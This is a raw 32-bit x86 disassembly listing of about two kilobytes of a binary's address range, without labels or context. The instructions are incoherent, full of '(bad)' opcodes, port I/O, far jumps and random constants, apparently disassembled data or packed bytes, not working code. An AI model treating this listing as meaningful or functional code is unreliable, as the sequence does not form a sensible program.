  40d5fb:	mov    esi,0x74f12a61
  40d600:	jecxz  0x40d668
  40d602:	dec    esp
  40d603:	inc    ecx
  40d604:	gs stos DWORD PTR es:[edi],eax
  40d606:	and    bl,BYTE PTR [edx-0x55e66395]
  40d60c:	jo     0x40d5b2
  40d60e:	aas    
  40d60f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d610:	fs not esp
  40d613:	add    al,0x5f
  40d615:	or     cl,BYTE PTR [edi+ebp*8-0x4c]
  40d619:	add    al,0xba
  40d61b:	sub    BYTE PTR [eax+edi*8-0x1501d539],bl
  40d622:	sbb    DWORD PTR [ebx-0x271c9101],eax
  40d628:	add    dh,BYTE PTR [ebp-0xba020da]
  40d62e:	mov    cl,0xb6
  40d630:	outs   dx,DWORD PTR ds:[esi]
  40d631:	in     eax,dx
  40d632:	(bad)  
  40d634:	xchg   ecx,eax
  40d635:	fcomp  DWORD PTR [esi+0x4d]
  40d638:	pop    ss
  40d639:	push   ebp
  40d63a:	cmp    DWORD PTR [eax],ebp
  40d63c:	shl    esp,0xea
  40d63f:	nop
  40d640:	xchg   ebx,eax
  40d641:	push   esp
  40d642:	das    
  40d643:	or     DWORD PTR ds:0x94a6f24b,edx
  40d649:	repnz push edx
  40d64b:	sti    
  40d64c:	pop    ds
  40d64d:	scas   al,BYTE PTR es:[edi]
  40d64e:	outs   dx,DWORD PTR ds:[esi]
  40d64f:	cdq    
  40d650:	add    al,0x70
  40d652:	mov    bl,0x31
  40d654:	cmp    edi,DWORD PTR [edx+0x7125f044]
  40d65a:	adc    ah,BYTE PTR [edi+edi*8]
  40d65d:	mov    ecx,0x10d6d010
  40d662:	ja     0x40d601
  40d664:	repz push ds
  40d666:	loopne 0x40d6a9
  40d668:	cld    
  40d669:	pop    ecx
  40d66a:	cld    
  40d66b:	sbb    DWORD PTR [ecx-0xe487d31],ebp
  40d671:	jno    0x40d66d
  40d673:	out    dx,al
  40d674:	out    0xd2,al
  40d676:	mov    eax,0xc4c57596
  40d67b:	imul   edi,DWORD PTR [edx+0x8],0x2e
  40d67f:	dec    edi
  40d680:	inc    ebx
  40d681:	jno    0x40d657
  40d683:	adc    DWORD PTR [ebx+0x790a2ba7],0x88cb914e
  40d68d:	sti    
  40d68e:	xchg   esp,eax
  40d68f:	shl    BYTE PTR [edx],1
  40d691:	ret    
  40d692:	push   edi
  40d693:	test   eax,0xf9f18705
  40d698:	repnz inc ecx
  40d69a:	adc    al,0x67
  40d69c:	mov    ds:0x363e17db,al
  40d6a1:	inc    ecx
  40d6a2:	sub    DWORD PTR [ebx+esi*8+0x34e2d4a9],ecx
  40d6a9:	fwait
  40d6aa:	retf   0xec78
  40d6ad:	sbb    ebp,0x3
  40d6b0:	pushf  
  40d6b1:	inc    edx
  40d6b2:	or     DWORD PTR [ebp+0x71],0x3f07d3f1
  40d6b9:	inc    edi
  40d6ba:	xor    BYTE PTR [eax],al
  40d6bc:	cmp    DWORD PTR [ecx],edx
  40d6be:	pop    eax
  40d6bf:	in     al,0xbf
  40d6c1:	cwde   
  40d6c2:	xchg   DWORD PTR [edx],edi
  40d6c4:	out    dx,al
  40d6c5:	cs jo  0x40d650
  40d6c8:	mov    ch,0x63
  40d6ca:	xchg   ebx,eax
  40d6cb:	lds    edi,FWORD PTR [edx+edx*2]
  40d6ce:	dec    esi
  40d6cf:	out    dx,al
  40d6d0:	add    ch,BYTE PTR [ebp-0x2ecac789]
  40d6d6:	dec    edi
  40d6d7:	adc    eax,DWORD PTR [edx]
  40d6d9:	daa    
  40d6da:	retf   0x3bba
  40d6dd:	sahf   
  40d6de:	mov    fs,si
  40d6e1:	xor    DWORD PTR [eax+edi*2-0x6d],eax
  40d6e5:	pop    ecx
  40d6e6:	push   edx
  40d6e7:	cmp    dl,BYTE PTR [ebx]
  40d6e9:	cld    
  40d6ea:	jnp    0x40d674
  40d6ec:	shl    BYTE PTR [eax-0x2b86eafa],cl
  40d6f2:	xchg   BYTE PTR [edi+esi*1-0x6c],dl
  40d6f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6f7:	loope  0x40d6a4
  40d6f9:	mov    ds:0x5312b571,eax
  40d6fe:	js     0x40d6e2
  40d700:	fisub  DWORD PTR [eax+0x1c0e7019]
  40d706:	jmp    0x3144:0x63db3f81
  40d70d:	jns    0x40d719
  40d70f:	loope  0x40d6e6
  40d711:	fbstp  TBYTE PTR [esi]
  40d713:	lahf   
  40d714:	jne    0x40d6fe
  40d716:	ins    DWORD PTR es:[edi],dx
  40d717:	je     0x40d6a4
  40d719:	dec    edi
  40d71a:	rcr    BYTE PTR [eax-0x16],0x38
  40d71e:	jo     0x40d6ca
  40d720:	mov    al,0xda
  40d722:	push   cs
  40d723:	xor    BYTE PTR [esi],bl
  40d725:	pushf  
  40d726:	int    0xb8
  40d728:	or     BYTE PTR [edx],bl
  40d72a:	ss fwait
  40d72c:	test   DWORD PTR [eax-0x7e],esp
  40d72f:	xchg   esi,eax
  40d730:	addr16 push es
  40d732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d733:	add    eax,0x4be1ca89
  40d738:	sar    BYTE PTR [edi-0x2eec3e58],0xf7
  40d73f:	fild   WORD PTR [ebx]
  40d741:	stc    
  40d742:	sti    
  40d743:	jecxz  0x40d7a1
  40d745:	fcomip st,st(7)
  40d747:	sti    
  40d748:	sbb    al,0xb3
  40d74a:	jb     0x40d755
  40d74c:	push   ebp
  40d74d:	cwde   
  40d74e:	xchg   bh,bh
  40d750:	rcl    BYTE PTR [edi],cl
  40d752:	cmp    al,0xd5
  40d754:	ja     0x40d71d
  40d756:	and    bh,BYTE PTR [ecx-0x392d0fdb]
  40d75c:	jle    0x40d73e
  40d75e:	inc    edi
  40d75f:	mov    eax,DWORD PTR [ecx+0x50]
  40d762:	cmp    BYTE PTR [esi-0x4ee81dbc],bh
  40d768:	test   al,0x27
  40d76a:	pop    ebp
  40d76b:	stos   BYTE PTR es:[edi],al
  40d76c:	or     eax,0xb940cda6
  40d771:	mov    DWORD PTR [bx+di+0x1a],eax
  40d775:	loopne 0x40d76d
  40d777:	or     al,0xb
  40d779:	or     edi,ebx
  40d77b:	(bad)  
  40d77c:	or     BYTE PTR [ebx+0x23],dh
  40d77f:	add    dh,cl
  40d781:	add    al,0xd
  40d783:	pop    ds
  40d784:	dec    ebx
  40d785:	pop    eax
  40d786:	lea    eax,[ebx]
  40d788:	push   ss
  40d789:	repnz test al,0x9
  40d78c:	ja     0x40d80a
  40d78e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d78f:	sub    al,0x26
  40d791:	nop
  40d792:	jp     0x40d740
  40d794:	dec    ebx
  40d795:	lock or al,0x9e
  40d798:	es xchg edx,eax
  40d79a:	cmp    al,0x1e
  40d79c:	xchg   DWORD PTR [ecx+0xcaa98e9],ecx
  40d7a2:	jno    0x40d7fc
  40d7a4:	cld    
  40d7a5:	xchg   ebp,eax
  40d7a6:	ins    DWORD PTR es:[edi],dx
  40d7a7:	addr16 mov dh,0xb8
  40d7aa:	rcl    ebx,1
  40d7ac:	shl    BYTE PTR [ebx],0xd
  40d7af:	or     ah,BYTE PTR [edx+0x41150c13]
  40d7b5:	sbb    cl,BYTE PTR ds:0x8e53f4a8
  40d7bb:	popa   
  40d7bc:	mov    esp,ss
  40d7be:	jg     0x40d7ab
  40d7c0:	jae    0x40d7f6
  40d7c2:	and    eax,0x6fefb6f2
  40d7c7:	mov    bh,0x92
  40d7c9:	push   edi
  40d7ca:	jg     0x40d796
  40d7cc:	dec    esi
  40d7cd:	sbb    eax,0x7f42efd4
  40d7d2:	sub    BYTE PTR [eax+0x4f],ah
  40d7d5:	sub    al,0x53
  40d7d7:	dec    eax
  40d7d8:	jle    0x40d7b7
  40d7da:	and    eax,0x760820ef
  40d7df:	mov    ah,0x4e
  40d7e1:	call   0x438e11c8
  40d7e6:	xor    DWORD PTR [eax-0x7e],edi
  40d7e9:	and    dh,dh
  40d7eb:	mov    al,0xc1
  40d7ed:	popf   
  40d7ee:	cwde   
  40d7ef:	gs hlt 
  40d7f1:	leave  
  40d7f2:	dec    ecx
  40d7f3:	bound  ebx,QWORD PTR [esi]
  40d7f5:	imul   edx,DWORD PTR [edi+esi*1],0xd5e64229
  40d7fc:	icebp  
  40d7fd:	rcl    ebx,0xac
  40d800:	jle    0x40d7aa
  40d802:	cdq    
  40d803:	xchg   esi,eax
  40d804:	sub    al,BYTE PTR [ebp+0x48]
  40d807:	push   ds
  40d808:	sub    eax,0x770feb77
  40d80d:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40d80f:	call   0x30dba009
  40d814:	jle    0x40d81a
  40d816:	loope  0x40d850
  40d818:	aad    0x7f
  40d81a:	imul   ebp,esp,0xe151de5c
  40d820:	aas    
  40d821:	dec    eax
  40d822:	pop    edi
  40d823:	cwde   
  40d824:	ja     0x40d7f3
  40d826:	xchg   ebp,eax
  40d827:	sbb    eax,0x1e832d93
  40d82c:	mov    dl,0x5e
  40d82e:	iretw  
  40d830:	sub    dh,BYTE PTR ds:0x26208a3f
  40d836:	mov    esi,0x693670db
  40d83b:	push   edi
  40d83c:	lock and esi,eax
  40d83f:	icebp  
  40d840:	sti    
  40d841:	mov    edx,0x2ac1627b
  40d846:	dec    ecx
  40d847:	add    eax,0xa6bece34
  40d84c:	rol    DWORD PTR [eax],1
  40d84e:	dec    esi
  40d84f:	and    edx,ebp
  40d851:	lds    ecx,FWORD PTR [edi]
  40d853:	jnp    0x40d814
  40d855:	jbe    0x40d826
  40d857:	sub    BYTE PTR [esp+ebp*8],0x6f
  40d85b:	retf   
  40d85c:	cmc    
  40d85d:	sub    DWORD PTR [eax-0x22],ecx
  40d860:	mov    al,0xfb
  40d862:	cmp    BYTE PTR [edx],bh
  40d864:	cwde   
  40d865:	mov    ch,0x8e
  40d867:	ins    DWORD PTR es:[edi],dx
  40d868:	sbb    DWORD PTR [ebx+0x7d],0x6d341853
  40d86f:	mov    ds:0x7aaa11c9,al
  40d874:	jmp    0xc5a7:0x10b575cb
  40d87b:	pop    edx
  40d87c:	xchg   BYTE PTR [ebp+0x78],bl
  40d87f:	jno    0x40d837
  40d881:	addr16 mov cl,0x3e
  40d884:	daa    
  40d885:	aas    
  40d886:	and    esp,ebx
  40d888:	div    BYTE PTR [edx-0x4e]
  40d88b:	xor    ah,BYTE PTR [edi-0x4ffa62a4]
  40d891:	jae    0x40d8aa
  40d893:	fsubr  QWORD PTR [eax]
  40d895:	clc    
  40d896:	adc    eax,0xb8ab1e58
  40d89b:	in     eax,dx
  40d89c:	(bad)  
  40d89e:	adc    al,0x96
  40d8a0:	out    dx,al
  40d8a1:	test   DWORD PTR [ecx+0x44],ecx
  40d8a4:	gs (bad) 
  40d8a9:	repnz imul esi,DWORD PTR [ecx-0x4a4cade],0x7326505a
  40d8b4:	or     BYTE PTR cs:0x1bf5859,cl
  40d8bb:	pop    es
  40d8bc:	js     0x40d896
  40d8be:	fwait
  40d8bf:	div    bh
  40d8c1:	cmp    BYTE PTR [edi+0x6a503748],al
  40d8c7:	(bad)
  40d8ca:	fs jmp 0x24e30c62
  40d8d0:	and    DWORD PTR [ebp+ebx*1+0x197e441e],0xee7c75f9
  40d8db:	or     BYTE PTR [ecx+0x24],0x14
  40d8df:	mov    ah,0x6f
  40d8e1:	push   ds
  40d8e2:	lea    edx,[ecx+0x89434b6]
  40d8e8:	sbb    al,0xde
  40d8ea:	maskmovq mm4,(bad)
  40d8eb:	mul    DWORD PTR [ecx]
  40d8ed:	sub    dh,BYTE PTR [eax]
  40d8ef:	mov    edx,0xb063ce64
  40d8f4:	aaa    
  40d8f5:	(bad)  
  40d8f6:	cmp    dh,BYTE PTR [ebx+0x2db0eb6b]
  40d8fc:	pushf  
  40d8fd:	xor    ecx,eax
  40d8ff:	mov    dh,0x63
  40d901:	hlt    
  40d902:	jmp    0xfae9184c
  40d907:	mov    bh,0xb8
  40d909:	mov    edi,0x93ef3b92
  40d90e:	inc    ebp
  40d90f:	or     edi,DWORD PTR [ecx-0x45a1dbd8]
  40d915:	and    al,0xfa
  40d917:	adc    bh,BYTE PTR [edi-0x4e]
  40d91a:	arpl   WORD PTR [edi-0x2],di
  40d91d:	mov    ah,BYTE PTR [esp+eiz*2+0x11]
  40d921:	and    esi,DWORD PTR [ecx-0x7f]
  40d924:	mov    esp,0xf8310452
  40d929:	jecxz  0x40d9a7
  40d92b:	fs jae 0x40d916
  40d92e:	mov    ds:0x9c2a3191,al
  40d933:	sahf   
  40d934:	popf   
  40d935:	xchg   esi,eax
  40d936:	fbld   TBYTE PTR [esp+eax*1]
  40d939:	mov    DWORD PTR [eax],esi
  40d93b:	int    0xf1
  40d93d:	jnp    0x40d9a7
  40d93f:	jecxz  0x40d94d
  40d941:	jge    0x40d930
  40d943:	push   0x80a80cc9
  40d948:	sub    DWORD PTR [ebp-0x10d4031a],esp
  40d94e:	data16 jecxz 0x40d926
  40d951:	ficom  DWORD PTR [eax+0x6f94e935]
  40d957:	xor    eax,0x80f08f79
  40d95c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d95d:	xchg   ebp,edi
  40d95f:	inc    dx
  40d961:	das    
  40d962:	add    al,0x56
  40d964:	mov    ebx,0x53c3563a
  40d969:	sbb    bl,BYTE PTR [edx-0x36]
  40d96c:	cmp    cl,BYTE PTR [ebx-0x67]
  40d96f:	stos   DWORD PTR es:[edi],eax
  40d970:	push   ebp
  40d971:	shr    BYTE PTR [eax+0x417d9fc5],1
  40d977:	jl     0x40d930
  40d979:	out    0x8d,eax
  40d97b:	fnsave [ebx+0x2a]
  40d97e:	xor    BYTE PTR [ebx+edx*2-0x6b],0xd5
  40d983:	jecxz  0x40d96c
  40d985:	ins    BYTE PTR es:[edi],dx
  40d986:	repnz pop eax
  40d988:	(bad)  
  40d989:	loop   0x40d9df
  40d98b:	sub    DWORD PTR [ecx],0x12
  40d98e:	cdq    
  40d98f:	xor    eax,DWORD PTR gs:[ebp-0x5d]
  40d993:	adc    cl,dh
  40d995:	push   0xffffffe4
  40d997:	mov    esi,cs
  40d999:	dec    ebp
  40d99a:	jp     0x40d9c2
  40d99c:	jns    0x40d9af
  40d99e:	dec    esi
  40d99f:	cmp    eax,0xb66e6a60
  40d9a4:	test   BYTE PTR [esi-0x2c84fc8a],bh
  40d9aa:	sahf   
  40d9ab:	pop    ss
  40d9ac:	adc    al,0x2d
  40d9ae:	jmp    0xd27:0x1188ab5a
  40d9b5:	dec    edi
  40d9b6:	call   0x5ab9:0x1aae5125
  40d9bd:	ret    0xd9a1
  40d9c0:	rcl    ah,0x9b
  40d9c3:	jg     0x40d981
  40d9c5:	xchg   BYTE PTR [esi],dh
  40d9c7:	outs   dx,BYTE PTR ds:[esi]
  40d9c8:	pop    ebx
  40d9c9:	(bad)  
  40d9ca:	xor    DWORD PTR [edi-0x227b8257],edx
  40d9d0:	in     eax,dx
  40d9d1:	jno    0x40da3a
  40d9d3:	mov    ecx,0xfe77b074
  40d9d8:	push   0x110c750a
  40d9dd:	xchg   esi,eax
  40d9de:	adc    BYTE PTR cs:[ecx-0x7d],dl
  40d9e2:	popf   
  40d9e3:	stc    
  40d9e4:	fs push ss
  40d9e6:	cwde   
  40d9e7:	into   
  40d9e8:	ins    DWORD PTR es:[edi],dx
  40d9e9:	add    al,0x5f
  40d9eb:	mov    cl,0x44
  40d9ed:	lods   al,BYTE PTR ds:[esi]
  40d9ee:	in     eax,0x2d
  40d9f0:	in     al,dx
  40d9f1:	mov    ds:0x3d93f49a,eax
  40d9f6:	inc    edx
  40d9f7:	fs xchg ebx,eax
  40d9f9:	xchg   DWORD PTR [edx-0x2d9bf04],eax
  40d9ff:	js     0x40d99f
  40da01:	(bad)  
  40da02:	pop    ecx
  40da03:	std    
  40da04:	push   0x113b7a25
  40da09:	das    
  40da0a:	mov    ebx,0xe8e4d3f8
  40da0f:	xor    DWORD PTR [esi],esp
  40da11:	int3   
  40da12:	ins    BYTE PTR es:[edi],dx
  40da13:	out    0xb8,eax
  40da15:	add    edx,esi
  40da17:	fwait
  40da18:	mov    dl,0x2b
  40da1a:	sbb    al,0x6f
  40da1c:	cmp    DWORD PTR [edi+0x64],edx
  40da1f:	test   DWORD PTR [eax],ebx
  40da21:	xchg   edi,eax
  40da22:	leave  
  40da23:	pop    edx
  40da24:	inc    eax
  40da25:	ja     0x40daa6
  40da27:	daa    
  40da28:	hlt    
  40da29:	call   0xf076f9d3
  40da2e:	sub    ch,BYTE PTR [ecx-0x61ee35a2]
  40da34:	push   ecx
  40da35:	lea    ebx,[ebx]
  40da37:	xrelease xchg BYTE PTR [eax-0x71],bh
  40da3b:	dec    edi
  40da3c:	lods   eax,DWORD PTR ds:[esi]
  40da3d:	aaa    
  40da3e:	or     BYTE PTR [edx],dh
  40da40:	xchg   edx,eax
  40da41:	and    DWORD PTR [edx-0x3b],ebp
  40da44:	ds clc 
  40da46:	sti    
  40da47:	stos   BYTE PTR es:[edi],al
  40da48:	mov    ah,0x5d
  40da4a:	fcmove st,st(1)
  40da4c:	int    0xdf
  40da4e:	(bad)  
  40da4f:	dec    esp
  40da50:	pop    ecx
  40da51:	int3   
  40da52:	mov    al,0xe3
  40da54:	mov    ss,edi
  40da56:	or     BYTE PTR [ebp-0x555bb4f3],bh
  40da5c:	pop    es
  40da5d:	xor    al,0xf3
  40da5f:	out    0xd6,eax
  40da61:	xchg   ebx,eax
  40da62:	xchg   DWORD PTR [eax],edi
  40da64:	stos   DWORD PTR es:[edi],eax
  40da65:	lock shl bh,1
  40da68:	jne    0x40d9f6
  40da6a:	mov    DWORD PTR [ebx+0x18],esi
  40da6d:	or     esp,DWORD PTR [ecx]
  40da6f:	int3   
  40da70:	jmp    FWORD PTR [ebx+0x74]
  40da73:	push   eax
  40da74:	jle    0x40dae4
  40da76:	jmp    0x485c:0x4887bd14
  40da7d:	jb     0x40dad6
  40da7f:	imul   esp,DWORD PTR [eax+0x2],0x72100d9e
  40da86:	xchg   esi,eax
  40da87:	and    DWORD PTR [ebx+0x30f1e39c],ebx
  40da8d:	lods   eax,DWORD PTR ds:[esi]
  40da8e:	fucomp st(4)
  40da90:	clc    
  40da91:	dec    ebp
  40da92:	jge    0x40db05
  40da94:	jmp    DWORD PTR cs:[eax+0xa]
  40da98:	dec    ebx
  40da99:	loop   0x40db00
  40da9b:	inc    esi
  40da9c:	das    
  40da9d:	rcr    BYTE PTR [esi-0x21],1
  40daa0:	in     al,dx
  40daa1:	fisub  WORD PTR [edx+0x3f]
  40daa4:	test   al,0x32
  40daa6:	fidiv  WORD PTR [esi]
  40daa8:	ret    0x2c46
  40daab:	test   dl,cl
  40daad:	(bad)  
  40daae:	mov    ecx,0x1c16998
  40dab3:	loope  0x40da92
  40dab5:	cmp    DWORD PTR [esi+esi*2-0x46199124],eax
  40dabc:	(bad)  
  40dabd:	retf   
  40dabe:	dec    ecx
  40dabf:	iret   
  40dac0:	add    DWORD PTR [edx-0x3],esi
  40dac3:	(bad)  
  40dac4:	mov    eax,0xd8f06575
  40dac9:	push   0xaacc45a2
  40dace:	mov    ebp,0x878d64a2
  40dad3:	fbld   TBYTE PTR [esi+0x56]
  40dad6:	xchg   edx,eax
  40dad7:	push   ss
  40dad8:	pop    esp
  40dad9:	jno    0x40da83
  40dadb:	push   ecx
  40dadc:	(bad)  
  40dadd:	in     al,dx
  40dade:	jbe    0x40db0c
  40dae0:	mov    DWORD PTR [ecx+0x5351e659],esp
  40dae6:	sub    eax,0x2e9acd52
  40daeb:	and    cl,BYTE PTR [edx+0x3a88444b]
  40daf1:	push   cs
  40daf2:	adc    eax,DWORD PTR [eax+ebx*1+0x5e1b069b]
  40daf9:	mov    esp,0x5f2d4a66
  40dafe:	scas   eax,DWORD PTR es:[edi]
  40daff:	leave  
  40db00:	cdq    
  40db01:	call   0x1834f696
  40db06:	mov    ecx,0x8c97a029
  40db0b:	clc    
  40db0c:	sub    ebx,DWORD PTR [esi-0x21d65e37]
  40db12:	mov    eax,ds:0x9c306987
  40db17:	js     0x40dac9
  40db19:	and    al,0x17
  40db1b:	jmp    0xf42:0xcce7ae6b
  40db22:	ds mov eax,0x1eff1f61
  40db28:	mov    dh,ah
  40db2a:	std    
  40db2b:	retf   0x47f8
  40db2e:	lds    ecx,FWORD PTR [edi+ebp*1]
  40db31:	in     eax,dx
  40db32:	aas    
  40db33:	scas   eax,DWORD PTR es:[edi]
  40db34:	lock mov DWORD PTR [esi+0x7970289f],eax
  40db3b:	loop   0x40db68
  40db3d:	mov    ch,0x28
  40db3f:	add    bl,BYTE PTR [edx+0x68775d16]
  40db45:	xchg   BYTE PTR [edi-0x3c],cl
  40db48:	out    0xf,al
  40db4a:	lea    ecx,[ebx]
  40db4c:	pop    es
  40db4d:	loop   0x40dbac
  40db4f:	fnsave [edx+0x1af482b9]
  40db55:	mov    WORD PTR es:[edi-0x76],cs
  40db59:	mov    cl,0x86
  40db5b:	dec    edx
  40db5c:	add    eax,0x492006f8
  40db61:	jbe    0x40db06
  40db63:	imul   ebx,DWORD PTR [eax+edx*2+0x3cba591f],0x903f4344
  40db6e:	cmp    al,0x78
  40db70:	jl     0x40db3a
  40db72:	or     al,0x5
  40db74:	sub    bl,al
  40db76:	inc    esp
  40db77:	add    DWORD PTR [ecx+esi*1+0x3c],ecx
  40db7b:	lahf   
  40db7c:	call   0xbd84ea1
  40db81:	(bad)
  40db84:	ret    0x4307
  40db87:	out    0xa1,al
  40db89:	pop    edx
  40db8a:	jmp    0x1b7a:0x72087cbc
  40db91:	jmp    0x40dbe1
  40db93:	ss cmp eax,0x31b1c4ce
  40db99:	jl     0x40db5e
  40db9b:	inc    eax
  40db9c:	dec    esi
  40db9d:	xor    DWORD PTR [esi+eax*4],0xffffffef
  40dba1:	sti    
  40dba2:	test   al,0x7f
  40dba4:	imul   BYTE PTR [ecx+0x33bd9d25]
  40dbaa:	dec    ebx
  40dbab:	retf   
  40dbac:	inc    edx
  40dbad:	lods   al,BYTE PTR ds:[esi]
  40dbae:	adc    edx,DWORD PTR [esi]
  40dbb0:	dec    eax
  40dbb1:	pop    ds
  40dbb2:	cmp    ah,al
  40dbb4:	sub    al,0x4e
  40dbb6:	push   esp
  40dbb7:	sub    eax,0x93592bb0
  40dbbc:	std    
  40dbbd:	cmp    esp,DWORD PTR [edx-0x5d]
  40dbc0:	sub    DWORD PTR [ecx-0x2c],ebx
  40dbc3:	sbb    dl,BYTE PTR [ebx+0x47]
  40dbc6:	and    eax,0x1b20d09a
  40dbcb:	test   al,0xb2
  40dbcd:	xor    DWORD PTR [ecx-0x614f5480],ebx
  40dbd3:	mov    dh,0x5
  40dbd5:	cli    
  40dbd6:	iret   
  40dbd7:	and    edx,esp
  40dbd9:	jo     0x40db78
  40dbdb:	test   DWORD PTR [edi+0x42f579a7],edi
  40dbe1:	imul   ebp,ecx,0x4041fcd5
  40dbe7:	xchg   ecx,eax
  40dbe8:	jl     0x40dc16
  40dbea:	xlat   BYTE PTR ds:[ebx]
  40dbeb:	das    
  40dbec:	dec    eax
  40dbed:	inc    edi
  40dbee:	jno    0x40dc2b
  40dbf0:	int3   
  40dbf1:	pop    ebp
  40dbf2:	ja     0x40dc5c
  40dbf4:	cli    
  40dbf5:	inc    edi
  40dbf6:	or     ah,bl
  40dbf8:	mov    bh,0x97
  40dbfa:	mov    eax,ds:0xc8af6d07
  40dbff:	nop
  40dc00:	outs   dx,DWORD PTR ds:[esi]
  40dc01:	inc    esi
  40dc02:	sbb    ecx,DWORD PTR ds:0x62636dfb
  40dc08:	cli    
  40dc09:	push   ebx
  40dc0a:	push   ebx
  40dc0b:	aas    
  40dc0c:	iret   
  40dc0d:	out    dx,eax
  40dc0e:	mov    BYTE PTR [esi+0x7b10797],bl
  40dc14:	sar    BYTE PTR [edi+0x1],cl
  40dc17:	mov    BYTE PTR [ebx-0x2188b8a3],ch
  40dc1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc1e:	(bad)  
  40dc1f:	xchg   ebx,eax
  40dc20:	jmp    0x40dc40
  40dc22:	mov    ecx,esi
  40dc24:	cmp    esp,DWORD PTR [ebp-0x1752a8ab]
  40dc2a:	stc    
  40dc2b:	and    ch,0xb0
  40dc2e:	imul   edi,esp,0xd2cce9f5
  40dc34:	bound  ebp,QWORD PTR [ecx-0x4b]
  40dc37:	mov    DWORD PTR [ecx+ebp*2-0x5a7d58c8],ebx
  40dc3e:	sar    BYTE PTR [ebx-0x254ceeb3],cl
  40dc44:	xchg   edi,eax
  40dc45:	(bad)  
  40dc46:	imul   esi,DWORD PTR [esp-0x215667db],0xffffffaa
  40dc4e:	lods   eax,DWORD PTR ds:[esi]
  40dc4f:	and    eax,0x2f06311e
  40dc54:	mov    ah,0x9
  40dc56:	xchg   edi,eax
  40dc57:	xlat   BYTE PTR ds:[ebx]
  40dc58:	in     al,dx
  40dc59:	test   DWORD PTR [eax-0x2],edi
  40dc5c:	sbb    al,0xfe
  40dc5e:	es cwde 
  40dc60:	ss push edi
  40dc62:	cmc    
  40dc63:	mov    al,ds:0x2ffd49f9
  40dc68:	push   eax
  40dc69:	push   edi
  40dc6a:	and    DWORD PTR [ebx+0x53ede314],ecx
  40dc70:	cld    
  40dc71:	mov    cl,BYTE PTR [ebx-0x7c73aaa4]
  40dc77:	shl    DWORD PTR [esi],0x6c
  40dc7a:	test   al,0xe6
  40dc7c:	mov    al,0xa5
  40dc7e:	pop    ebp
  40dc7f:	and    eax,0xb206caf
  40dc84:	and    ebp,DWORD PTR [esi+0x77]
  40dc87:	js     0x40dc40
  40dc89:	test   BYTE PTR [ebx-0x34],cl
  40dc8c:	in     al,dx
  40dc8d:	ins    DWORD PTR es:[edi],dx
  40dc8e:	jbe    0x40dcbc
  40dc90:	cwde   
  40dc91:	mov    BYTE PTR [ebp-0x3898ae95],ah
  40dc97:	stos   BYTE PTR es:[edi],al
  40dc98:	call   FWORD PTR [esi-0x2c0ee794]
  40dc9e:	add    eax,0xd093975e
  40dca3:	inc    esp
  40dca4:	mov    WORD PTR [ebp+0x23bee093],?
  40dcaa:	xchg   DWORD PTR [edi],esp
  40dcac:	push   ss
  40dcad:	pop    edi
  40dcae:	fiadd  DWORD PTR [edx+0x1a]
  40dcb1:	loopne 0x40dc44
  40dcb3:	sbb    al,0x96
  40dcb5:	fstp   TBYTE PTR [edi]
  40dcb7:	pop    esi
  40dcb8:	push   edi
  40dcb9:	in     eax,dx
  40dcba:	jmp    0xa313b4e3
  40dcbf:	mov    bh,0xf3
  40dcc1:	adc    DWORD PTR [edx],ebx
  40dcc3:	lods   al,BYTE PTR ds:[esi]
  40dcc4:	ror    esp,cl
  40dcc6:	xchg   esp,ebx
  40dcc8:	push   edi
  40dcc9:	dec    ecx
  40dcca:	jb     0x40dc56
  40dccc:	retf   
  40dccd:	call   0xaa6f:0xf0c9fcf5
  40dcd4:	cld    
  40dcd5:	adc    DWORD PTR [edi],edi
  40dcd7:	dec    ecx
  40dcd8:	pop    esi
  40dcd9:	pop    esi
  40dcda:	out    0xec,eax
  40dcdc:	jae    0x40dd54
  40dcde:	dec    ebp
  40dcdf:	cmp    cl,dl
  40dce1:	jb     0x40dcab
  40dce3:	mov    ah,0x80
  40dce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dce6:	lds    edx,FWORD PTR [edi+eax*8-0x59b578f7]
  40dced:	fst    QWORD PTR ds:0x269f5fea
  40dcf3:	adc    cl,cl
  40dcf5:	out    0x3b,eax
  40dcf7:	in     eax,0xde
  40dcf9:	inc    ebp
  40dcfa:	sahf   
  40dcfb:	mov    eax,0xec60996
  40dd00:	(bad)  
  40dd01:	push   cs
  40dd02:	mov    bh,0xd2
  40dd04:	cwde   
  40dd05:	pop    ds
  40dd06:	fistp  QWORD PTR [esi]
  40dd08:	lock sar BYTE PTR [ecx-0x4ad1febb],0x50
  40dd10:	loopne 0x40dccf
  40dd12:	shr    DWORD PTR [ebx],cl
  40dd14:	aaa    
  40dd15:	aad    0xc8
  40dd17:	pushf  
  40dd18:	call   0x2d1ee074
  40dd1d:	dec    ebp
  40dd1e:	outs   dx,DWORD PTR ds:[esi]
  40dd1f:	test   BYTE PTR cs:[edi-0x3b06fae],ch
  40dd26:	sahf   
  40dd27:	inc    edi
  40dd28:	cmp    cl,BYTE PTR [ebx+0x6d75434f]
  40dd2e:	setns  BYTE PTR [edx+0x24]
  40dd32:	jo     0x40dd21
  40dd34:	arpl   WORD PTR [ebp+0x10],bp
  40dd37:	jmp    0x2ef3bdaf
  40dd3c:	(bad)  
  40dd3d:	cmp    BYTE PTR [edx],al
  40dd3f:	xor    ebp,DWORD PTR [edx]
  40dd41:	adc    eax,0x7881e2b8
  40dd46:	popa   
  40dd47:	cmc    
  40dd48:	(bad)  
  40dd49:	xchg   esp,eax
  40dd4a:	cmp    cl,BYTE PTR [esi-0x6a]
  40dd4d:	popa   
  40dd4e:	xchg   BYTE PTR [eax],ah
  40dd50:	call   0x22b0:0x16faf48c
  40dd57:	loopne 0x40dd59
  40dd59:	jmp    0x40dd86
  40dd5b:	daa    
  40dd5c:	mov    edi,0xdf283cb1
  40dd61:	sub    al,0xfd
  40dd63:	lahf   
  40dd64:	xchg   ecx,eax
  40dd65:	adc    esp,DWORD PTR [eax]
  40dd67:	or     BYTE PTR cs:[edx+0x53],al
  40dd6b:	out    0x35,al
  40dd6d:	xor    DWORD PTR ds:0x9ca8c021,ebp
  40dd73:	sub    al,BYTE PTR [eax-0x3a0a82d9]
  40dd79:	mov    eax,ds:0x5f873321
  40dd7e:	scas   eax,DWORD PTR es:[edi]
  40dd7f:	inc    esp
  40dd80:	int3   
